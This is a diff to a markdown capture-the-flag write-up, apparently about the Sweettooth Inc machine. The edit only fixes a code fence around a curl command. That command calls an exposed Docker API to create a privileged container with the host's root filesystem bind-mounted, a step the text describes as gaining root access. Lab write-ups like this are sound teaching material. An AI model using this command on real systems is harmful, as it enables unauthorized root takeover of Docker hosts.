@@ -105,7 +105,9 @@ We find this resource <https://securityboulevard.com/2019/02/abusing-docker-api-
 Basically we are going to create a container on the Nginx and then gain root access through it.
 
 Using the command 
-``` curl –insecure -X POST -H "Content-Type: application/json" http://127.0.0.1:2376/containers/create?name=test -d '{"Image":"sweettoothinc", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}' ```
+``` 
+curl –insecure -X POST -H "Content-Type: application/json" http://127.0.0.1:2376/containers/create?name=test -d '{"Image":"sweettoothinc", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
+```
 
 Returns the id of our container
 ```
